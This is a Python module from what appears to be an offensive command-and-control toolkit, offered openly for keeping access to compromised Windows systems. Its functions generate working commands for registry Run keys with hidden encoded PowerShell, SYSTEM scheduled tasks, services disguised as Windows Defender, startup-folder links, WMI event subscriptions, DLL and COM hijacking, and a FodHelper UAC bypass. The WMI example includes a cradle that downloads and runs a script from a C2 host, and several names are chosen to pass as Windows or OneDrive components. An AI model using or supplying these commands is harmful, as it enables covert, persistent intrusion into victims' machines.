"""
KRYON Command & Control - Persistence Mechanisms

Maintain long-term access to compromised systems.

Clearance Level: Omega-Strike (Command & Control Authority)
Specialization: Persistence, access maintenance, privilege escalation
Mission: Ensure continued access to target systems across reboots

This module provides:
- Registry-based persistence (Windows)
- Scheduled task persistence
- Service creation
- Startup folder persistence
- WMI event subscription
- DLL hijacking
- Privilege escalation helpers
"""

import base64
import secrets
from typing import Any, Optional


def create_registry_persistence(
    payload_path: str,
    key: str = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    value_name: Optional[str] = None,
    encoded: bool = True,
) -> dict[str, Any]:
    """
    Create Windows registry persistence.

    Registry Run keys execute on user login.

    Common persistence keys:
    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce
    - HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce

    Args:
        payload_path: Path to payload executable
        key: Registry key path
        value_name: Registry value name (random if None)
        encoded: Use encoded PowerShell command

    Returns:
        Registry persistence commands

    Example:
        >>> from skynet.tools.command_and_control import create_registry_persistence
        >>>
        >>> # Create registry persistence
        >>> result = create_registry_persistence(
        ...     payload_path="C:\\\\Windows\\\\Temp\\\\svchost.exe",
        ...     key="HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        ...     value_name="WindowsUpdate"
        ... )
        >>>
        >>> # Execute on target:
        >>> # powershell.exe -c <command>
        >>> print(result['powershell_command'])
    """
    results = {
        "payload": payload_path,
        "registry_key": key,
        "value_name": value_name or f"System{secrets.token_hex(4)}",
        "powershell_command": "",
        "cmd_command": "",
        "success": False,
        "error": None,
    }

    try:
        # PowerShell registry command
        if encoded:
            ps_cmd = f"New-ItemProperty -Path 'Registry::{key}' -Name '{results['value_name']}' -Value '{payload_path}' -PropertyType String -Force"
            encoded_cmd = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
            results["powershell_command"] = f"powershell.exe -NoP -NonI -W Hidden -Enc {encoded_cmd}"
        else:
            results["powershell_command"] = (
                f"powershell.exe -c \"New-ItemProperty -Path 'Registry::{key}' -Name '{results['value_name']}' -Value '{payload_path}' -PropertyType String -Force\""
            )

        # CMD registry command
        results["cmd_command"] = f'reg add "{key}" /v "{results["value_name"]}" /t REG_SZ /d "{payload_path}" /f'

        # Removal command
        results["removal_command"] = f'reg delete "{key}" /v "{results["value_name"]}" /f'

        results["success"] = True
        results["info"] = "Persistence executes on user login"

    except Exception as e:
        results["error"] = str(e)

    return results


def create_scheduled_task(
    task_name: str,
    payload_path: str,
    trigger: str = "logon",
    interval_minutes: Optional[int] = None,
    run_as: str = "SYSTEM",
) -> dict[str, Any]:
    """
    Create Windows scheduled task for persistence.

    Triggers:
    - logon: Execute on user logon
    - startup: Execute on system startup
    - daily: Execute daily at specified time
    - interval: Execute every N minutes

    Args:
        task_name: Name of scheduled task
        payload_path: Path to payload
        trigger: Task trigger type
        interval_minutes: Interval for periodic execution
        run_as: User to run as (SYSTEM, current user)

    Returns:
        Scheduled task creation commands

    Example:
        >>> from skynet.tools.command_and_control import create_scheduled_task
        >>>
        >>> # Create task that runs every 10 minutes as SYSTEM
        >>> result = create_scheduled_task(
        ...     task_name="WindowsUpdateCheck",
        ...     payload_path="C:\\\\Windows\\\\Temp\\\\update.exe",
        ...     trigger="interval",
        ...     interval_minutes=10,
        ...     run_as="SYSTEM"
        ... )
        >>>
        >>> print(result['schtasks_command'])
    """
    results = {
        "task_name": task_name,
        "payload": payload_path,
        "trigger": trigger,
        "schtasks_command": "",
        "powershell_command": "",
        "success": False,
        "error": None,
    }

    try:
        # Build schtasks command
        if trigger == "logon":
            results["schtasks_command"] = (
                f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onlogon /ru "{run_as}" /f'
            )

        elif trigger == "startup":
            results["schtasks_command"] = (
                f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc onstart /ru "{run_as}" /f'
            )

        elif trigger == "daily":
            results["schtasks_command"] = (
                f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc daily /st 09:00 /ru "{run_as}" /f'
            )

        elif trigger == "interval" and interval_minutes:
            results["schtasks_command"] = (
                f'schtasks /create /tn "{task_name}" /tr "{payload_path}" /sc minute /mo {interval_minutes} /ru "{run_as}" /f'
            )

        # PowerShell version
        results["powershell_command"] = f"""
$action = New-ScheduledTaskAction -Execute "{payload_path}"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "{run_as}" -RunLevel Highest
Register-ScheduledTask -TaskName "{task_name}" -Action $action -Trigger $trigger -Principal $principal -Force
"""

        # Removal command
        results["removal_command"] = f'schtasks /delete /tn "{task_name}" /f'

        results["success"] = True
        results["info"] = f"Task executes on {trigger}"

    except Exception as e:
        results["error"] = str(e)

    return results


def create_service_persistence(
    service_name: str,
    payload_path: str,
    display_name: Optional[str] = None,
    description: Optional[str] = None,
    start_type: str = "auto",
) -> dict[str, Any]:
    """
    Create Windows service for persistence.

    Requires administrator privileges.

    Args:
        service_name: Service name
        payload_path: Path to service executable
        display_name: Display name for service
        description: Service description
        start_type: auto (automatic), demand (manual), boot, system

    Returns:
        Service creation commands

    Example:
        >>> from skynet.tools.command_and_control import create_service_persistence
        >>>
        >>> # Create Windows service
        >>> result = create_service_persistence(
        ...     service_name="WinDefendService",
        ...     payload_path="C:\\\\Windows\\\\System32\\\\svchost.exe",
        ...     display_name="Windows Defender Service",
        ...     description="Provides real-time protection",
        ...     start_type="auto"
        ... )
        >>>
        >>> print(result['sc_command'])
    """
    results = {
        "service_name": service_name,
        "payload": payload_path,
        "display_name": display_name or service_name,
        "sc_command": "",
        "powershell_command": "",
        "success": False,
        "error": None,
    }

    try:
        # sc.exe command
        results["sc_command"] = (
            f'sc create {service_name} binPath= "{payload_path}" start= {start_type} DisplayName= "{results["display_name"]}"'
        )

        if description:
            results["sc_command"] += f' && sc description {service_name} "{description}"'

        # Start service
        results["start_command"] = f"sc start {service_name}"

        # PowerShell version
        results["powershell_command"] = f"""
New-Service -Name "{service_name}" -BinaryPathName "{payload_path}" -DisplayName "{results["display_name"]}" -StartupType Automatic
"""

        if description:
            results["powershell_command"] += f'\nSet-Service -Name "{service_name}" -Description "{description}"'

        # Removal commands
        results["removal_command"] = f"sc stop {service_name} && sc delete {service_name}"

        results["success"] = True
        results["info"] = "Service persistence requires admin privileges"

    except Exception as e:
        results["error"] = str(e)

    return results


def create_startup_folder_persistence(
    payload_path: str, user: str = "current", link_name: Optional[str] = None
) -> dict[str, Any]:
    """
    Copy payload to Windows startup folder.

    Startup folders:
    - Current user: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
    - All users: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp

    Args:
        payload_path: Path to payload
        user: current or all
        link_name: Name for startup link

    Returns:
        Startup folder persistence commands

    Example:
        >>> from skynet.tools.command_and_control import create_startup_folder_persistence
        >>>
        >>> # Copy to startup folder
        >>> result = create_startup_folder_persistence(
        ...     payload_path="C:\\\\Windows\\\\Temp\\\\agent.exe",
        ...     user="current",
        ...     link_name="OneDriveSync.lnk"
        ... )
        >>>
        >>> print(result['copy_command'])
    """
    results = {
        "payload": payload_path,
        "user": user,
        "link_name": link_name or f"System{secrets.token_hex(4)}.lnk",
        "startup_path": "",
        "copy_command": "",
        "success": False,
        "error": None,
    }

    try:
        if user == "current":
            results["startup_path"] = "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        else:
            results["startup_path"] = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp"

        # Copy command
        results["copy_command"] = f'copy "{payload_path}" "{results["startup_path"]}\\{results["link_name"]}"'

        # PowerShell version
        results["powershell_command"] = (
            f"Copy-Item -Path '{payload_path}' -Destination '{results['startup_path']}\\{results['link_name']}'"
        )

        # Create shortcut instead of copy
        results["shortcut_command"] = f"""
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{results["startup_path"]}\\{results["link_name"]}")
$Shortcut.TargetPath = "{payload_path}"
$Shortcut.Save()
"""

        results["success"] = True
        results["info"] = "Payload executes on user login"

    except Exception as e:
        results["error"] = str(e)

    return results


def create_wmi_persistence(
    payload_command: str, event_name: Optional[str] = None, trigger: str = "logon"
) -> dict[str, Any]:
    """
    Create WMI event subscription for persistence.

    WMI persistence is stealthier than registry/scheduled tasks.

    Args:
        payload_command: Command to execute
        event_name: Name for WMI event (random if None)
        trigger: logon, startup, interval

    Returns:
        WMI subscription commands

    Example:
        >>> from skynet.tools.command_and_control import create_wmi_persistence
        >>>
        >>> # Create WMI persistence on logon
        >>> result = create_wmi_persistence(
        ...     payload_command=\"\"\"
        ...         powershell.exe -NoP -W Hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://c2/b.ps1')"
        ...     \"\"\",
        ...     event_name="WindowsUpdate",
        ...     trigger="logon"
        ... )
        >>>
        >>> print(result['powershell_script'])
    """
    results = {
        "payload_command": payload_command,
        "event_name": event_name or f"Event{secrets.token_hex(6)}",
        "trigger": trigger,
        "powershell_script": "",
        "success": False,
        "error": None,
    }

    try:
        filter_name = f"{results['event_name']}Filter"
        consumer_name = f"{results['event_name']}Consumer"

        # Build WMI query based on trigger
        if trigger == "logon":
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'"
        elif trigger == "startup":
            query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
        else:
            query = "SELECT * FROM __InstanceCreationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_Process'"

        # Create WMI subscription
        results["powershell_script"] = f"""
# Create WMI Event Filter
$FilterArgs = @{{
    Name = "{filter_name}"
    EventNameSpace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "{query}"
}}
$Filter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments $FilterArgs

# Create WMI Event Consumer
$ConsumerArgs = @{{
    Name = "{consumer_name}"
    CommandLineTemplate = "{payload_command}"
}}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $ConsumerArgs

# Bind Filter to Consumer
$BindArgs = @{{
    Filter = $Filter
    Consumer = $Consumer
}}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments $BindArgs
"""

        # Removal script
        results["removal_script"] = f"""
Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter "Name='{filter_name}'" | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer -Filter "Name='{consumer_name}'" | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%{filter_name}%'" | Remove-WmiObject
"""

        results["success"] = True
        results["info"] = "WMI persistence is harder to detect than registry keys"

    except Exception as e:
        results["error"] = str(e)

    return results


def create_dll_hijacking(dll_name: str, target_application: str, payload_dll_path: str) -> dict[str, Any]:
    """
    Setup DLL hijacking for persistence.

    DLL hijacking exploits DLL search order to load malicious DLL.

    Args:
        dll_name: Name of DLL to hijack (e.g., version.dll)
        target_application: Application directory for DLL placement
        payload_dll_path: Path to malicious DLL

    Returns:
        DLL hijacking setup instructions

    Example:
        >>> from skynet.tools.command_and_control import create_dll_hijacking
        >>>
        >>> # Hijack version.dll for application persistence
        >>> result = create_dll_hijacking(
        ...     dll_name="version.dll",
        ...     target_application="C:\\\\Program Files\\\\SomeApp",
        ...     payload_dll_path="C:\\\\Windows\\\\Temp\\\\version.dll"
        ... )
        >>>
        >>> print(result['instructions'])
    """
    results = {
        "dll_name": dll_name,
        "target_app": target_application,
        "payload_dll": payload_dll_path,
        "hijack_path": "",
        "success": False,
        "error": None,
    }

    try:
        import os

        results["hijack_path"] = os.path.join(target_application, dll_name)

        results["copy_command"] = f'copy "{payload_dll_path}" "{results["hijack_path"]}"'

        results["instructions"] = f"""
DLL Hijacking Setup:

1. Identify application that loads {dll_name}
2. Copy malicious DLL to application directory:
   {results["copy_command"]}

3. When application starts, it loads malicious DLL instead of system DLL

Common hijackable DLLs:
- version.dll
- wlbsctrl.dll
- oci.dll
- msvcr100.dll
- dwmapi.dll

Detection:
- Low: DLL hijacking is hard to detect
- Persists across reboots
- Executes with application privileges
"""

        results["success"] = True
        results["info"] = "DLL hijacking requires finding vulnerable application"

    except Exception as e:
        results["error"] = str(e)

    return results


def create_com_hijacking(clsid: str, payload_dll_path: str) -> dict[str, Any]:
    """
    Create COM object hijacking for persistence.

    COM hijacking redirects COM object to malicious DLL.

    Args:
        clsid: CLSID to hijack
        payload_dll_path: Path to malicious DLL

    Returns:
        COM hijacking registry commands

    Example:
        >>> from skynet.tools.command_and_control import create_com_hijacking
        >>>
        >>> # Hijack COM object
        >>> result = create_com_hijacking(
        ...     clsid="{BCDE0395-E52F-467C-8E3D-C4579291692E}",
        ...     payload_dll_path="C:\\\\Windows\\\\Temp\\\\malicious.dll"
        ... )
    """
    results = {
        "clsid": clsid,
        "payload_dll": payload_dll_path,
        "registry_command": "",
        "success": False,
        "error": None,
    }

    try:
        # Create registry key for COM hijacking
        reg_path = f"HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32"

        results["registry_command"] = f'reg add "{reg_path}" /ve /t REG_SZ /d "{payload_dll_path}" /f'

        results["powershell_command"] = f"""
New-Item -Path "Registry::HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32" -Force
Set-ItemProperty -Path "Registry::HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32" -Name "(Default)" -Value "{payload_dll_path}"
"""

        results["success"] = True
        results["info"] = "COM hijacking executes when hijacked COM object is instantiated"

    except Exception as e:
        results["error"] = str(e)

    return results


def escalate_privileges(method: str = "uac_bypass", payload_path: str = "") -> dict[str, Any]:
    """
    Generate privilege escalation commands.

    Methods:
    - uac_bypass: Bypass UAC using known techniques
    - token_impersonation: Impersonate SYSTEM token
    - service_exploit: Exploit misconfigured services

    Args:
        method: Escalation method
        payload_path: Payload to execute with elevated privileges

    Returns:
        Privilege escalation commands

    Example:
        >>> from skynet.tools.command_and_control import escalate_privileges
        >>>
        >>> # UAC bypass
        >>> result = escalate_privileges(
        ...     method="uac_bypass",
        ...     payload_path="C:\\\\Windows\\\\Temp\\\\elevated.exe"
        ... )
        >>>
        >>> print(result['powershell_command'])
    """
    results = {
        "method": method,
        "payload": payload_path,
        "powershell_command": "",
        "success": False,
        "error": None,
    }

    try:
        if method == "uac_bypass":
            # FodHelper UAC bypass
            results["powershell_command"] = f"""
# FodHelper UAC Bypass
New-Item "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Force
Set-ItemProperty "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "(Default)" -Value "{payload_path}"
Set-ItemProperty "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value ""
Start-Process "C:\\Windows\\System32\\fodhelper.exe"
"""

        elif method == "token_impersonation":
            results["powershell_command"] = """
# Token Impersonation (requires SeImpersonatePrivilege)
# Use tools like Juicy Potato, PrintSpoofer, or RoguePotato
"""
            results["info"] = "Token impersonation requires SeImpersonatePrivilege"

        elif method == "service_exploit":
            results["powershell_command"] = """
# Find services with weak permissions
Get-WmiObject win32_service | Where-Object {$_.PathName -notmatch "C:\\\\Windows"} | Select Name, DisplayName, PathName, StartName
"""

        results["success"] = True

    except Exception as e:
        results["error"] = str(e)

    return results
